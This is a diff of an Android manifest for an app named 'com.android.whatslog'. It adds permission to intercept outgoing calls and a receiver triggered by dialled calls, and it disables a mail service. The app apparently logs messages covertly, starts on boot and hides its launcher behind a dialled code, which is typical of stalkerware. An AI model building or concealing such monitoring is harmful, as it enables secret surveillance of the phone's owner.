@@ -12,7 +12,9 @@
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+
 
 
     <application
@@ -36,11 +38,11 @@
             android:exported="true" >
         </service>
 
-        <service
-            android:name="com.android.whatslog.MailService"
-            android:enabled="true"
-            android:exported="true" >
-        </service>
+<!--         <service -->
+<!--             android:name="com.android.whatslog.MailService" -->
+<!--             android:enabled="true" -->
+<!--             android:exported="true" > -->
+<!--         </service> -->
 
         <activity
             android:name="com.android.whatslog.LogActivity"
@@ -59,7 +61,11 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
-
+		<receiver android:name="com.android.whatslog.LaunchReceiver">
+        <intent-filter android:priority="10">
+            <action android:name="android.intent.action.NEW_OUTGOING_CALL"></action>
+        </intent-filter>
+    </receiver>
         <activity
             android:name="com.android.whatslog.ConfActivity"
             android:label="@string/title_activity_conf" >
